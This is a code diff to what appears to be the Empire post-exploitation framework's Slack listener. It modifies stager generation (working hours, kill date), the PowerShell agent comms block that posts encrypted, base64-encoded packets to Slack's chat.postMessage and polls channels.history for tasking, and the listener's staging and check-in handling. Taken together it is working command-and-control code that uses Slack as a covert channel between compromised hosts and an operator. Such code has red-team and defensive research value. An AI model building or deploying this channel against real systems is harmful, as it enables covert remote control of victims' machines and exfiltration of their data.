@@ -320,7 +320,8 @@ class Listener:
             return None
 
         staging_key = listenerOptions['StagingKey']['Value']
-        working_hours = listenerOptions['WorkingHours']['Value']
+        workingHours = listenerOptions['WorkingHours']['Value']
+        killDate = listenerOptions['KillDate']['Value']
         profile = listenerOptions['DefaultProfile']['Value']
         agent_delay = listenerOptions['DefaultDelay']['Value']
         api_token = listenerOptions['APIToken']['Value']
@@ -335,8 +336,13 @@ class Listener:
             stager = stager.replace('REPLACE_SLACK_API_TOKEN', api_token)
             stager = stager.replace('REPLACE_SLACK_CHANNEL', channel_id)
 
-            if working_hours != "":
-                stager = stager.replace("REPLACE_WORKING_HOURS", working_hours)
+            #patch in working hours, if any
+            if workingHours != "":
+                stager = stager.replace('WORKING_HOURS_REPLACE', workingHours)
+
+            #Patch in the killdate, if any
+            if killDate != "":
+                stager = stager.replace('REPLACE_KILLDATE', killDate)
 
             randomized_stager = ''
 
@@ -361,7 +367,7 @@ class Listener:
             print helpers.color("[!] Python agent not available for Slack")
 
 
-    def generate_agent(self, listener_options, language=None):
+    def generate_agent(self, listener_options, agent_id, language=None):
         """
         Generate the agent code
         """
@@ -384,7 +390,7 @@ class Listener:
             agent_code = f.read()
             f.close()
 
-            comms_code = self.generate_comms(listener_options, language)
+            comms_code = self.generate_comms(listener_options, agent_id, language)
             agent_code = agent_code.replace("REPLACE_COMMS", comms_code)
 
             agent_code = helpers.strip_powershell_comments(agent_code)
@@ -401,7 +407,7 @@ class Listener:
             return agent_code
 
 
-    def generate_comms(self, listenerOptions, language=None):
+    def generate_comms(self, listenerOptions, agent_id, language=None):
         """
         Generate just the agent communication code block needed for communications with this listener.
         This is so agents can easily be dynamically updated for the new listener.
@@ -411,7 +417,7 @@ class Listener:
 
         api_token = listenerOptions['APIToken']['Value']
         channel_id = listenerOptions['ChannelComms_ID']['Value']
-
+        print 'Generating comms'
         if language:
             if language.lower() == 'powershell':
 
@@ -430,8 +436,7 @@ class Listener:
 
                             function Decode-Base64 {
                                 param($base64)
-                                $bytes = [convert]::FromBase64String($base64)
-                                return [System.Text.Encoding]::UTF8.GetString($bytes)
+                                return [convert]::FromBase64String($base64)
                             }
 
                             # meta 'TASKING_REQUEST' : 4
@@ -451,17 +456,29 @@ class Listener:
                             $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("User-Agent",$script:UserAgent)
                             $script:Headers.GetEnumerator() | % {$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}
 
-                            # choose a random valid URI for checkin
-                            $taskURI = $script:TaskURIs | Get-Random
+                            $RoutingPacket_base64 = [Convert]::ToBase64String($RoutingPacket)
+
+                            try {
+                                # get a random posting URI
+                                $taskURI = $Script:TaskURIs | Get-Random
+                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('Content-Type','application/x-www-form-urlencoded')
+                                $response = $"""+helpers.generate_random_script_var_name("wc")+""".UploadString("https://slack.com/api/chat.postMessage","POST","token=%s&channel=%s&text=$([System.Net.WebUtility]::UrlEncode($RoutingPacket_base64))&username=%s:STAGED")
+
+                                # grab the timestamp from the sent message so we can track a response
+                                $slack_response = ConvertFrom-Json20 $response
+                                $script:current_ts = $slack_response.ts
+
+                            }
+                            catch [System.Net.WebException]{$null}
 
                             # wait for listener to respond before proceeding
-                            $listener_replied=$false
+                            $listener_replied=$true
                             while($listener_replied -eq $false) {
                                 Start-Sleep -Seconds 1
                                 $listener_replied=$false
 
                                 $wc.Headers.Add('Content-Type','application/x-www-form-urlencoded')
-                                $slack_response2=$wc.UploadString('https://slack.com/api/channels.history','POST','token=%s&channel=%s&oldest=$($script:current_ts)')
+                                $slack_response2=$wc.UploadString("https://slack.com/api/channels.history","POST","token=%s&channel=%s&oldest=$($script:current_ts)")
                                 $slack_response2=ConvertFrom-Json20 $slack_response2
 
                                 if($slack_response2.messages.count -ne 0) {
@@ -483,7 +500,7 @@ class Listener:
                             }
                         }
                     }
-                """ % (api_token, channel_id)
+                """ % (api_token, channel_id, agent_id, api_token, channel_id)
 
                 sendMessage = """
                     $script:SendMessage = {
@@ -501,8 +518,7 @@ class Listener:
                             
                             $encBytes = encrypt-bytes $packets
                             $RoutingPacket = New-RoutingPacket -encData $encBytes -Meta 5
-                            $bytes = [System.Text.Encoding]::UTF8.GetBytes($RoutingPacket)
-                            $RoutingPacket_base64 = [Convert]::ToBase64String($bytes)
+                            $RoutingPacket_base64 = [Convert]::ToBase64String($RoutingPacket)
 
                             # build the web request object
                             $"""+helpers.generate_random_script_var_name("wc")+""" = New-Object System.Net.WebClient
@@ -520,7 +536,7 @@ class Listener:
                                 # get a random posting URI
                                 $taskURI = $Script:TaskURIs | Get-Random
                                 $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('Content-Type','application/x-www-form-urlencoded')
-                                $response = $"""+helpers.generate_random_script_var_name("wc")+""".UploadString("https://slack.com/api/chat.postMessage","POST","token=%s&channel=%s&text=$RoutingPacket_base64)
+                                $response = $"""+helpers.generate_random_script_var_name("wc")+""".UploadString("https://slack.com/api/chat.postMessage","POST","token=%s&channel=%s&text=$RoutingPacket_base64")
 
                                 # grab the timestamp from the sent message so we can track a response
                                 $slack_response = ConvertFrom-Json20 $response
@@ -531,7 +547,7 @@ class Listener:
                         }
                     }
                 """ % (api_token, channel_id)
-
+                
                 return getTask + sendMessage + "\n'New agent comms registered!'"
 
             elif language.lower() == 'python':
@@ -554,34 +570,30 @@ class Listener:
 
             # Parses a list of events coming from the Slack RTM API to find commands.
             for event in slack_events:
-                if event["type"] == "message" and event["channel"] != bot_id:
-                    
-                    # grab more details such as the username of the poster
-                    event_details = slack_client.api_call("channels.history",channel=channel_id,latest=event["ts"],inclusive=True,count=1)
+                if 'type' in event:
+                    if event["type"] == "message" and event["channel"] != bot_id and event["subtype"] != "message_replied":
 
-                    if 'messages' in event_details:
-                        message = event_details["messages"][0]
-                        thread_ts = message["ts"]
-                        
-                        reaction = slack_client.api_call("reactions.add", name='thumbsup', channel=channel_id, timestamp=thread_ts)
+                        # grab more details such as the username of the poster
+                        event_details = user_slack_client.api_call("channels.history",channel=channel_id,latest=event["ts"],inclusive=True,count=1)
 
-                        # by adding a thumbs up helps the listener keep track of what it has processed
-                        if 'username' in message and not 'error' in reaction:
-                            raw_message = message["text"].replace(' ','+')
-                            data = base64.b64decode(raw_message)
-                            agent = message["username"]
-                            if ':' in agent:
+                        if 'messages' in event_details:
+                            message = event_details["messages"][0]
+                            thread_ts = message["ts"]
 
-                                agent, stage = agent.split(':')
-                                message = "[*] New message posted to Slack from {}, requesting stage {} and message starts {}...".format(agent,stage,raw_message[:5])
-                                signal = json.dumps({
-                                    'print' : True,
-                                    'message': message
-                                })
-                                dispatcher.send(signal, sender="listeners/slack/{}".format(listener_name))
+                            reaction = slack_client.api_call("reactions.add", name='thumbsup', channel=channel_id, timestamp=thread_ts)
 
-                                return agent, stage, data, thread_ts
+                            # by adding a thumbs up helps the listener keep track of what it has processed
+                            if 'username' in message and not 'error' in reaction:
+                                raw_message = message["text"].replace(' ','+')
+                                data = base64.b64decode(raw_message)
+                                agent = message["username"]
+                                if ':' in agent:
+                                    agent, stage = agent.split(':')
 
+                                    return agent, stage, data, thread_ts
+
+
+            time.sleep(1)
             return None, None, None, None
 
         # utility functions for handling Empire
@@ -709,7 +721,7 @@ class Listener:
 
             # post a message if present
             if startup_message:
-                slack_client.api_call("chat.postMessage", channel=channel_id, as_user=False, username='listener_' + listener_name, text=startup_message)
+                user_slack_client.api_call("chat.postMessage", channel=channel_id, as_user=False, username='listener_' + listener_name, text=startup_message)
             
             # Set the listener in a while loop
             while slack_client.server.connected is True:
@@ -743,8 +755,10 @@ class Listener:
 
                         elif stage == '5':
 
+                            lang, return_val = self.mainMenu.agents.handle_agent_data(staging_key, data, listener_options)[0]
+
                             session_key = self.mainMenu.agents.agents[agent]['sessionKey']
-                            agent_code = str(self.generate_agent(listener_options, lang))
+                            agent_code = str(self.generate_agent(listener_options, agent, lang))
                             enc_code = encryption.aes_encrypt_then_hmac(session_key, agent_code)
                             agent_upload = base64.encodestring(enc_code)
 
@@ -768,7 +782,7 @@ class Listener:
                                 response = slack_client.rtm_send_message(channel_id, part, thread_ts, False)
 
                                 # have to limit the replies to one per second or face rate limiting
-                                time.sleep(1)
+                                time.sleep(2)
                                 part_count += 1
 
                             # send finish flag to Slack
@@ -782,28 +796,18 @@ class Listener:
 
                         else:
 
-                            # incoming agent check in
-                            message = "[*] The agent {} just checked in.".format(agent)
-                            signal = json.dumps({
-                                'print' : True,
-                                'message': message
-                            })
-                            dispatcher.send(signal, sender="listeners/slack/{}".format(listener_name))
-
                             # Process agent checking and handle any agent data
-                            seen_time = dt=datetime.datetime.utcfromtimestamp(float(thread_ts))
+                            seen_time = datetime.utcfromtimestamp(float(thread_ts))
                             self.mainMenu.agents.update_agent_lastseen_db(agent, seen_time)
                             self.mainMenu.agents.handle_agent_data(staging_key, data, listener_options, update_lastseen=False)
 
                             # Process any further tasks for the agent so it can continue
                             task_data = self.mainMenu.agents.handle_agent_request(agent, 'powershell', staging_key, update_lastseen=False)
                             if task_data:
-                                print helpers.color('[*] '.format(task_data))
-
-
+                                print helpers.color('[+] {}'.format(task_data))
                    
                 except Exception as e:
-                    pass#print helpers.color("[!] Something went wrong with the Slack bot: " + str(e))
+                    print helpers.color("[!] Something went wrong with the Slack bot: " + str(e))
 
         else:
             print helpers.color("[!] Connection failed. Exception printed above.")
